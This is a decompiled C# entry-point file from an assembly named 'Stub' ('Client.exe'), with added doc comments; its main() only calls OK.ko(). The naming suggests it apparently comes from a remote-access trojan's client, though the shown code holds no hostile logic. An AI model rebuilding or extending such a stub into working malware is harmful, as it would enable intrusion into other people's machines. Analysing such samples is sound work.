// Decompiled with JetBrains decompiler
// Type: j.A
// Assembly: Stub, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 292CE86C-33B7-4D1B-9DE2-B41CEB9702D8
// Assembly location: C:\Users\User\Desktop\Client.exe

/**
 * @file A.cs
 * @brief Defines the main entry point for the application.
 *
 * This class contains the main method, which serves as the starting point for execution.
 * It calls the primary initialization routine in the OK class.
 */

using System;

#nullable disable
namespace j
{
  public class A
  {
    /**
 * @brief Main entry point of the application.
 *
 * This method is marked with the [STAThread] attribute to indicate a single-threaded apartment model.
 * It simply calls the OK.ko() method to start the core functionality.
 */
    [STAThread]
    public static void main() => OK.ko();
  }
}
